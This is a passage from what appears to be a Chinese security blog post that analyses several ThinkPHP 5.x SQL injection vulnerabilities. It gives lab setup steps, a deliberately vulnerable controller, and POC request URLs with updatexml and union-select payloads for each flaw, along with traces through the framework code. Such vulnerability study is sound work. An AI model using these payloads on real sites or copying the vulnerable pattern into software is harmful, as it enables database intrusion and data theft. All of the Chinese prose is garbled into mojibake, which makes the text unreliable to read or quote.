æˆäº†SQLæ³¨å…¥æ¼æ´ã€‚</p></blockquote><p>åœ¨<code>thinkphp/library/think/Request.php</code> ä¸­ï¼Œæœ‰è°ƒç”¨å†…ç½®è¿‡æ»¤ï¼ˆç›´æ¥æ›¿æ¢ä¸ºç©ºï¼‰æ–¹æ³•ï¼Œå¯¹å‚æ•°<code>exp</code>è¿›è¡Œè¿‡æ»¤ï¼Œåœ¨case <code>exp</code>çš„æƒ…å†µä¸‹ï¼Œæ— æ³•é€ æˆæ¼æ´ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192928.png" alt="carbon"></p><p>é—®é¢˜ï¼šä¸ºä»€ä¹ˆä¸èƒ½å°†æ¶æ„Payload ç”¨<code>username[2]</code> æ¥æŠ•é€’ï¼Ÿ</p><p>åŸå› ï¼š</p><p>åŒæ ·çš„åŠæ³•ï¼Œä¸‹æ–­ç‚¹ï¼Œdebug å¯ä»¥çœ‹åˆ°ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192915.png" alt="image-20200913181025221"></p><p>å›åˆ°ä¹‹å‰çš„<code>parseDate</code> æ–¹æ³•ï¼Œ<code>username[2]</code>çš„å€¼é€šè¿‡<code>floatval</code>å‡½æ•°å¤„ç†</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192902.png" alt="image-20200913171023035"></p><p>payload å˜ä¸ºäº†<code>0</code> ï¼Œä¸” ä¼šå­˜åœ¨SQL é”™è¯¯ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192852.png" alt="image-20200913182241348"></p><h2 id="åˆ©ç”¨æ€»ç»“"><a href="#åˆ©ç”¨æ€»ç»“" class="headerlink" title="åˆ©ç”¨æ€»ç»“"></a>åˆ©ç”¨æ€»ç»“</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192749.png" alt="image-20200913185834897"></p><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192803.png" alt="image-20200913151252661"></p><h1 id="SQLæ³¨å…¥äºŒ-update"><a href="#SQLæ³¨å…¥äºŒ-update" class="headerlink" title="SQLæ³¨å…¥äºŒ(update)"></a>SQLæ³¨å…¥äºŒ(update)</h1><p>å¤ç°ä»£ç è·å–ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink&#x2F;think&#x3D;5.1  tpdemo3</span><br></pre></td></tr></table></figure><p>å°† <strong>composer.json</strong> æ–‡ä»¶çš„ <strong>require</strong> å­—æ®µè®¾ç½®æˆå¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;require&quot;: &#123;</span><br><span class="line">    &quot;php&quot;: &quot;&gt;&#x3D;5.6.0&quot;,</span><br><span class="line">    &quot;topthink&#x2F;framework&quot;: &quot;5.1.7&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨<code>../config/app.php</code> ä¸­ï¼Œéœ€è¦ä¿®æ”¹<code>app_trace</code> ä¸ºtrueï¼Œ <code>app_debug</code> é»˜è®¤å¼€å¯äº†ã€‚</p><p>åˆ›å»ºæ•°æ®åº“ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">create database tpdemo;</span><br><span class="line">use tpdemo;</span><br><span class="line">create table users(</span><br><span class="line">id int primary key auto_increment,</span><br><span class="line">username varchar(50) not null</span><br><span class="line">);</span><br><span class="line">insert into users(id,username) values(1,&#39;testuser&#39;);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¹Ÿè¦è®¾ç½®username å­—æ®µ ä¸º<code>NULL</code> æ‰è¡Œ</p><p>ä¿®æ”¹<code>/application/index/controller/index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $username = request()-&gt;get(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">        db(<span class="string">&#x27;users&#x27;</span>)-&gt;where([<span class="string">&#x27;id&#x27;</span> =&gt; <span class="number">1</span>])-&gt;update([<span class="string">&#x27;username&#x27;</span> =&gt; $username]);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Update success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index&#x2F;index?username[0]&#x3D;point&amp;username[1]&#x3D;1&amp;username[2]&#x3D;updatexml(1,concat(0x7,user(),0x7e),1)^&amp;username[3]&#x3D;0</span><br></pre></td></tr></table></figure><p>å¾ˆSQL æ³¨å…¥ä¸€éå¸¸ç±»ä¼¼ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914203133.png" alt="image-20200914152750668"></p><h2 id="å½±å“ç‰ˆæœ¬-1"><a href="#å½±å“ç‰ˆæœ¬-1" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p>æ¼æ´å½±å“ç‰ˆæœ¬ï¼š <strong>5.1.6&lt;=ThinkPHP&lt;=5.1.7</strong> (éæœ€æ–°çš„ <strong>5.1.8</strong> ç‰ˆæœ¬ä¹Ÿå¯åˆ©ç”¨)ã€‚</p><h2 id="æ¼æ´æ¦‚è¿°-1"><a href="#æ¼æ´æ¦‚è¿°-1" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><p>æœ¬æ¬¡æ¼æ´å­˜åœ¨äº <strong>Mysql</strong> ç±»çš„ <strong>parseArrayData</strong> æ–¹æ³•ä¸­ç”±äºç¨‹åºæ²¡æœ‰å¯¹æ•°æ®è¿›è¡Œå¾ˆå¥½çš„è¿‡æ»¤ï¼Œå°†æ•°æ®æ‹¼æ¥è¿› <strong>SQL</strong> è¯­å¥ï¼Œå¯¼è‡´ <strong>SQLæ³¨å…¥æ¼æ´</strong> çš„äº§ç”Ÿ</p><p>æ³¨å…¥ç±»å‹ï¼š<code>update</code> æ³¨å…¥</p><h2 id="æ¼æ´åˆ†æ-1"><a href="#æ¼æ´åˆ†æ-1" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><blockquote><p>å¯¹äºå¼€æºé¡¹ç›®ï¼Œåœ¨issue æˆ–è€… commit \ Releases è®°å½•ä¸­ï¼Œå°±èƒ½æ‰¾åˆ°å†å²æ¼æ´ä¿¡æ¯ã€‚è¿™ä¸€ç‚¹åœ¨CTFä¸­ç»å¸¸ç”¨åˆ°ï¼Œå°¤å…¶æ˜¯Node.js çš„ç¬¬ä¸‰æ–¹ä¾èµ–æ¼æ´ã€‚</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914203118.png" alt="image-20200914161022479"></p><ul><li>ä¸‹æ–­ç‚¹ï¼Œdebugã€‚è§‚å¯Ÿå‚æ•°ä¼ é€’è¿‡ç¨‹</li><li>ç›‘æ§MySQL</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914203111.png" alt="image-20200914184917592"></p><hr><p>ä¸‹æ–­ç‚¹ï¼Œå¼€å¯Debugï¼Œæ‰“Payloadã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202218.png" alt="image-20200914173011583"></p><p><code>../thinkphp/library/think/db/Query.php</code> ä¸­ï¼ŒPayload ä¼ å…¥Query ç±»çš„ <code>update</code>æ–¹æ³•ï¼Œè·Ÿè¿›è¯¥æ–¹æ³•ï¼Œè¯¥æ–¹æ³•è°ƒç”¨äº†<code>Connection</code> ç±»çš„è¯¥æ–¹æ³•ä¸º<code>update</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•åˆè°ƒç”¨äº† </p><p><code>$this-&gt;builder</code> çš„<code>update</code> æ–¹æ³•ï¼Œæ­¤å¤„çš„<code>$this-&gt;builder</code> ä¸ºä¸º<code>think\db\builder\Mysql</code> ç±»ã€‚<code>class Mysql extends Builder</code> ï¼Œè¯¥ç±»ç»§æ‰¿äº<code>Builder</code> ç±»ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202201.png" alt="image-20200914170732409"></p><p>åœ¨<code>Builder</code>ç±»ä¸­çš„<code>update</code>æ–¹æ³•ï¼Œè°ƒç”¨äº†<code>parseData</code>æ–¹æ³•ï¼Œï¼ˆæ­£å¦‚ä¸Šå›¾debugç»“æœã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202036.png" alt="image-20200914184754350"></p><p>åœ¨è¯¥æ–¹æ³•ä¸­çš„<code>swich</code>è¯­å¥ä¸­ï¼Œä¹‹å‰å‡ºç°è¿‡æ¼æ´ï¼Œç°åœ¨å¤šäº†ä¸€æ¡default è¯­å¥ã€‚è€Œåœ¨æ–°ç‰ˆæœ¬ä¸­è¢«åˆ é™¤äº†ã€‚</p><p>è·Ÿè¿›åˆ°<code>parseData</code> æ–¹æ³•ï¼Œå‘ç°Payload åˆè¢«<code>parseArrayData</code>æ–¹æ³•å¤„ç†ï¼Œç»§ç»­è·Ÿè¿›ï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202026.png" alt="image-20200914185836504"></p><p>åœ¨<code>../thinkphp/library/think/db/builder/Mysql.php</code> ä¸­çš„ 200 è¡Œè¿”å›result çš„åœ°æ–¹æ‰“æ–­ç‚¹ï¼Œè°ƒè¯•ç»“æœå¦‚ä¸‹ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202011.png"></p><p>æ­¤å¤„å°†å¯æ§å˜é‡ç»è¿‡æ‹¼æ¥åè¢«å¸¦å…¥æ•°æ®åº“è¿›è¡ŒæŸ¥è¯¢ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914201959.png" alt="image-20200914193548748"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseArrayData</span>(<span class="params">Query $query, $data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">list</span>($type, $value) = $data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (strtolower($type)) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;point&#x27;</span>:</span><br><span class="line">            $fun   = <span class="keyword">isset</span>($data[<span class="number">2</span>]) ? $data[<span class="number">2</span>] : <span class="string">&#x27;GeomFromText&#x27;</span>;</span><br><span class="line">            $point = <span class="keyword">isset</span>($data[<span class="number">3</span>]) ? $data[<span class="number">3</span>] : <span class="string">&#x27;POINT&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span> (is_array($value)) &#123;</span><br><span class="line">                $value = implode(<span class="string">&#x27; &#x27;</span>, $value);</span><br><span class="line">            &#125;</span><br><span class="line">            $result = $fun . <span class="string">&#x27;(\&#x27;&#x27;</span> . $point . <span class="string">&#x27;(&#x27;</span> . $value . <span class="string">&#x27;)\&#x27;)&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $result = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result = $fun . <span class="string">&#x27;(\&#x27;&#x27;</span> . $point . <span class="string">&#x27;(&#x27;</span> . $value . <span class="string">&#x27;)\&#x27;)&#x27;</span>;</span><br></pre></td></tr></table></figure><p>ä¸‰ä¸ªå˜é‡å‡å¯æ§ã€‚å½¢å¼ä¸ºï¼š<code>$a(&#39;$b($c)&#39;)</code> </p><blockquote><p>ç°åœ¨å°±æ˜¯æƒ³åŠæ³•å¦‚ä½•é—­åˆï¼Œç„¶åè¿›è¡Œæ³¨å…¥æ”»å‡»ã€‚</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE &#96;users&#96;  SET &#96;username&#96; &#x3D; $a(&#39;$b($c)&#39;)  WHERE  &#96;id&#96; &#x3D; 1;</span><br></pre></td></tr></table></figure><p>å³è®©<code>$fun</code> ä¸ºæˆ‘ä»¬çš„æ¶æ„Payload å³å¯ã€‚ç„¶åé—­åˆæ‰åé¢çš„éƒ¨åˆ†ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7,user(),0x7e),1)^(&#39;0(1)&#39;)</span><br></pre></td></tr></table></figure><h2 id="åˆ©ç”¨æ€»ç»“-1"><a href="#åˆ©ç”¨æ€»ç»“-1" class="headerlink" title="åˆ©ç”¨æ€»ç»“"></a>åˆ©ç”¨æ€»ç»“</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914201929.png" alt="carbon"></p><p>ä¸‹å›¾æ¥è‡ªå‚è€ƒèµ„æ–™ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914201900.png" alt="8"></p><h2 id="æ¼æ´ä¿®å¤-1"><a href="#æ¼æ´ä¿®å¤-1" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>å‡çº§æœ€æ–°ç‰ˆï¼Œ</p><p>å®˜æ–¹ç›´æ¥åˆ äº†<code>parseArrayDate</code> å‡½æ•°ã€‚</p><blockquote><p>ä¸€ç‚¹ç‚¹æ„Ÿæƒ³ï¼Œæˆ‘æ„Ÿè§‰æŒ‰ç…§è¿™ä¸ªå¸ˆå‚…çš„åˆ†ææ€è·¯ï¼Œæ˜¯é€†ç€payload å»åˆ†æçš„æ¼æ´åŸå› ï¼Œæˆ‘å¥½æƒ³æ­£é¢ç›´æ¥æŒ–å•Šï¼Œèœæ­»äº†ã€‚</p></blockquote><h1 id="SQLæ³¨å…¥ä¸‰-select"><a href="#SQLæ³¨å…¥ä¸‰-select" class="headerlink" title="SQLæ³¨å…¥ä¸‰(select)"></a>SQLæ³¨å…¥ä¸‰(select)</h1><p>æ–°å¢å‚è€ƒèµ„æ–™ï¼š<a href="https://www.cnblogs.com/wangtanzhi/p/12732557.html">https://www.cnblogs.com/wangtanzhi/p/12732557.html</a></p><blockquote><p>å­¦ä¹ å°±æ˜¯è¦å­¦ä¹ ä¸åŒå¤§ä½¬çš„æ€è·¯ï¼Œç„¶åè½¬æ¢ä¸ºè‡ªå·±çš„æ€è·¯ã€‚</p></blockquote><h2 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index.php&#x2F;index&#x2F;index&#x2F;?username&#x3D;)%20union%20select%20updatexml(1,concat(0x7,user(),0x7e),1)%23</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105138.png" alt="image-20200914214213065"></p><p>sqlmap ä¹Ÿå¯ä»¥è·‘å‡ºç»“æœã€‚</p><h2 id="å½±å“ç‰ˆæœ¬-2"><a href="#å½±å“ç‰ˆæœ¬-2" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p>ThinkPHP5 å…¨ç‰ˆæœ¬</p><h2 id="æ¼æ´æ¦‚è¿°-2"><a href="#æ¼æ´æ¦‚è¿°-2" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><p>æœ¬æ¬¡æ¼æ´å­˜åœ¨äº <strong>Mysql</strong> ç±»çš„ <strong>parseWhereItem</strong> æ–¹æ³•ä¸­ã€‚ç”±äºç¨‹åºæ²¡æœ‰å¯¹æ•°æ®è¿›è¡Œå¾ˆå¥½çš„è¿‡æ»¤ï¼Œå°†æ•°æ®æ‹¼æ¥è¿› <strong>SQL</strong> è¯­å¥ï¼Œå¯¼è‡´ <strong>SQLæ³¨å…¥æ¼æ´</strong> çš„äº§ç”Ÿã€‚</p><h2 id="æ¼æ´åˆ†æ-2"><a href="#æ¼æ´åˆ†æ-2" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><ul><li>MySQL ç›‘æ§</li></ul><blockquote><p>ç›‘æ§ä¸åˆ°ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆã€‚é…ç½®ä¹Ÿæ˜¯æ­£ç¡®çš„ã€‚</p></blockquote><p><code>/application/index/controller/index.php</code></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105308.png" alt="image-20200914220015121"></p><blockquote><p>ç„¶åç”¨æˆ·è¾“å…¥çš„æ•°æ®ä¼šåŸæ ·è¿›å…¥æ¡†æ¶çš„ SQL æŸ¥è¯¢æ–¹æ³•ä¸­ã€‚é¦–å…ˆç¨‹åºå…ˆè°ƒç”¨ Query ç±»çš„ where æ–¹æ³•ï¼Œé€šè¿‡å…¶ parseWhereExp æ–¹æ³•åˆ†ææŸ¥è¯¢è¡¨è¾¾å¼ï¼Œç„¶åå†è¿”å›å¹¶ç»§ç»­è°ƒç”¨ select æ–¹æ³•å‡†å¤‡å¼€å§‹æ„å»º select è¯­å¥ã€‚ï¼ˆè¿™ä¸ªç‚¹å¾—è®°ä½ï¼Œæ¡†æ¶çš„sqlæŸ¥è¯¢æ–¹æ³•å…ˆè¿›å…¥ Query ç±»ï¼‰</p></blockquote><hr><blockquote><p>ç¨‹åºé»˜è®¤è°ƒç”¨ <strong>Request</strong> ç±»çš„ <strong>get</strong> æ–¹æ³•ä¸­ä¼šè°ƒç”¨è¯¥ç±»çš„ <strong>input</strong> æ–¹æ³•ï¼Œä½†æ˜¯è¯¥æ–¹æ³•é»˜è®¤æƒ…å†µä¸‹å¹¶æ²¡æœ‰å¯¹æ•°æ®è¿›è¡Œå¾ˆå¥½çš„è¿‡æ»¤ï¼Œæ‰€ä»¥ç”¨æˆ·è¾“å…¥çš„æ•°æ®ä¼šåŸæ ·è¿›å…¥æ¡†æ¶çš„ <strong>SQL</strong> æŸ¥è¯¢æ–¹æ³•ä¸­ã€‚é¦–å…ˆç¨‹åºå…ˆè°ƒç”¨ <strong>Query</strong> ç±»çš„ <strong>where</strong> æ–¹æ³•ï¼Œé€šè¿‡å…¶ <strong>parseWhereExp</strong> æ–¹æ³•åˆ†ææŸ¥è¯¢è¡¨è¾¾å¼ï¼Œç„¶åå†è¿”å›å¹¶ç»§ç»­è°ƒç”¨ <strong>select</strong> æ–¹æ³•å‡†å¤‡å¼€å§‹æ„å»º <strong>select</strong> è¯­å¥ã€‚</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105416.png" alt="image-20200914222945520"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105701.png" alt="image-20200914224146213"></p><p>æ­¤å¤„è°ƒç”¨<code>$this-&gt;builder</code>çš„<code>select</code>æ–¹æ³•ã€‚è€Œæ­¤å¤„<code>$this-&gt;builder</code> ä¸º<code>think/db/builder/Mysql</code> ç±»ï¼Œç»§æ‰¿äº<code>Builder</code> ç±»ã€‚å› æ­¤è°ƒç”¨çš„æ˜¯<code>Builder</code>ç±»çš„<code>select</code> æ–¹æ³•</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105718.png" alt="image-20200914225616763"></p><p>åœ¨ <strong>select</strong> æ–¹æ³•ä¸­ï¼Œç¨‹åºä¼šå¯¹ <strong>SQL</strong> è¯­å¥æ¨¡æ¿ç”¨å˜é‡å¡«å……ï¼Œå…¶ä¸­ç”¨æ¥å¡«å…… <strong>%WHERE%</strong> çš„å˜é‡ä¸­å­˜åœ¨ç”¨æˆ·è¾“å…¥çš„æ•°æ®ã€‚è·Ÿè¿›è¿™ä¸ª <strong>where</strong> åˆ†æå‡½æ•°ï¼Œä¼šå‘ç°å…¶ä¼šè°ƒç”¨ç”ŸæˆæŸ¥è¯¢æ¡ä»¶ <strong>SQL</strong> è¯­å¥çš„ <strong>buildWhere</strong> å‡½æ•°ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105734.png" alt="image-20200914231827114"></p><p>æ­¤å¤„<code>$where</code> ç»è¿‡ <code>buildWhere</code> æ–¹æ³•å¤„ç†åè¿”å›<code>$whereStr</code></p><p><code>parseWhereItem</code> çš„ <code>where</code>  å­å•å…ƒå‡½æ•°æ–¹æ³•è°ƒç”¨ï¼Œå½“æ“ä½œç¬¦ä¸º<code>EXP</code> æ—¶ï¼Œç»è¿‡æ‹¼æ¥å¸¦å…¥SQLæŸ¥è¯¢ï¼Œé€ æˆSQLæ³¨å…¥ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105750.png" alt="image-20200914235436560"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105805.png" alt="image-20200915000616883"></p><p>å®Œæ•´çš„æ–¹æ³•è°ƒç”¨å¦‚ä¸Šå›¾ç»¿è‰²éƒ¨åˆ†ã€‚</p><h2 id="åˆ©ç”¨æ€»ç»“-2"><a href="#åˆ©ç”¨æ€»ç»“-2" class="headerlink" title="åˆ©ç”¨æ€»ç»“"></a>åˆ©ç”¨æ€»ç»“</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105825.png" alt="carbon (1)"></p><h2 id="æ¼æ´ä¿®å¤-2"><a href="#æ¼æ´ä¿®å¤-2" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>å®˜ç½‘æœªä¿®å¤ã€‚</p><blockquote><p>ç»§æ‰¿ç±»ï¼Œç­‰é¢å‘å¯¹è±¡çš„åŸºæœ¬çŸ¥è¯†å¾ˆé‡è¦ã€‚</p></blockquote><h1 id="SQLæ³¨å…¥å››-select"><a href="#SQLæ³¨å…¥å››-select" class="headerlink" title="SQLæ³¨å…¥å››(select)"></a>SQLæ³¨å…¥å››(select)</h1><p>æ¼æ´å¤ç°ç¯å¢ƒå’Œä¸Šé¢åº”è¯¥æ˜¯å·®ä¸å¤šçš„ã€‚</p><h2 id="POC-3"><a href="#POC-3" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public&#x2F;index.php&#x2F;index&#x2F;index?username[0]&#x3D;not%20like&amp;username[1][0]&#x3D;%%&amp;username[1][1]&#x3D;233&amp;username[2]&#x3D;)%20union%20select%201,user()%23</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915125740.png" alt="image-20200915122649716"></p><h2 id="å½±å“ç‰ˆæœ¬-3"><a href="#å½±å“ç‰ˆæœ¬-3" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p><strong>ThinkPHP: 5.0.10</strong></p><h2 id="æ¼æ´æ¦‚è¿°-3"><a href="#æ¼æ´æ¦‚è¿°-3" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><blockquote><p>æœ¬æ¬¡æ¼æ´å­˜åœ¨äº <strong>Mysql</strong> ç±»çš„ <strong>parseWhereItem</strong> æ–¹æ³•ä¸­ã€‚ç”±äºç¨‹åºæ²¡æœ‰å¯¹æ•°æ®è¿›è¡Œå¾ˆå¥½çš„è¿‡æ»¤ï¼Œç›´æ¥å°†æ•°æ®æ‹¼æ¥è¿› <strong>SQL</strong> è¯­å¥ã€‚å†ä¸€ä¸ªï¼Œ <strong>Request</strong> ç±»çš„ <strong>filterValue</strong> æ–¹æ³•æ¼è¿‡æ»¤ <strong>NOT LIKE</strong> å…³é”®å­—ï¼Œæœ€ç»ˆå¯¼è‡´ <strong>SQLæ³¨å…¥æ¼æ´</strong> çš„äº§ç”Ÿ</p></blockquote><p>åœ¨MySQL ä¸­ <code>NOT LIKE</code>  ä¸ºæ¨¡ç³ŠæŸ¥è¯¢ï¼Œä»€ä¹ˆæ˜¯æ¨¡ç³ŠæŸ¥è¯¢å‘¢ï¼Ÿ</p><blockquote><p>mysqlæ¨¡ç³ŠæŸ¥è¯¢likeçš„ç”¨æ³•:</p><p>æŸ¥è¯¢userè¡¨ä¸­å§“åä¸­æœ‰â€œç‹â€å­—çš„ï¼š</p><p>select * from user where name like â€˜%ç‹%â€™</p><p>mysqlæ¨¡ç³ŠæŸ¥è¯¢not likeçš„ç”¨æ³•</p><p>æŸ¥è¯¢userè¡¨ä¸­å§“åä¸­æ²¡æœ‰â€œç‹â€å­—çš„ï¼š</p><p>select * from user where name not like â€˜%ç‹%â€™</p></blockquote><h2 id="æ¼æ´åˆ†æ-3"><a href="#æ¼æ´åˆ†æ-3" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>è¯¥SQLæ³¨å…¥æ¼æ´å½±å“ç‰ˆæœ¬ä¸º <code>5.0.10</code> ï¼Œå› æ­¤å» <code>5.0.11</code> çš„æ›´æ–°è®°å½•ä¸­ï¼Œåˆ™å¯ä»¥æŸ¥çœ‹ç›¸å…³çš„ä¿®å¤æ“ä½œã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915190936.png" alt="image-20200915132004061"></p><p>Commit ï¼š<a href="https://github.com/top-think/framework/commit/f43688a30ce921df1c7cda771620c0fbe1868e7d">https://github.com/top-think/framework/commit/f43688a30ce921df1c7cda771620c0fbe1868e7d</a></p><p>ï¼ˆ æ€¥éœ€å¦‚ä½•å¿«é€Ÿå®šä½åˆ° æŸä¸ªæŒ‡å®šçš„commit è®°å½•çš„æ–¹æ³•ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915140312.png" alt="image-20200915133611309"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œä¹‹å‰æ˜¯æ²¡æœ‰å°†ç‰¹æ®Šå­—ç¬¦ <code>NOT LIKE</code>   ç»™è¿‡æ»¤æ‰ã€‚</p><hr><p>æ ¹æ®Payloadæ¥åˆ†ææ¼æ´åŸç†ï¼š</p><blockquote><p>ä¸ç®¡ä»¥å“ªç§æ–¹å¼ä¼ é€’æ•°æ®ç»™æœåŠ¡å™¨ï¼Œè¿™äº›æ•°æ®åœ¨ <strong>ThinkPHP</strong> ä¸­éƒ½ä¼šç»è¿‡ <strong>Request</strong> ç±»çš„ <strong>input</strong> æ–¹æ³•</p></blockquote><p>åœ¨<code>input</code> æ–¹æ³•ä¸­ï¼šä¼ å…¥çš„æ•°æ®ä¼šç»è¿‡ filterValueè¿‡æ»¤<code>å’Œ </code>å¼ºåˆ¶ç±»å‹è½¬æ¢,ç„¶åè¿”å›ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915190852.png"></p><p>è·Ÿè¿›è¯¥æ–¹æ³•ï¼ŒæŸ¥çœ‹æ˜¯å¦‚ä½•å®ç°çš„ã€‚å‘ç°åˆä¼šè°ƒç”¨åˆ°<code>filterExp</code>  æ–¹æ³•ï¼Œ</p><p><img 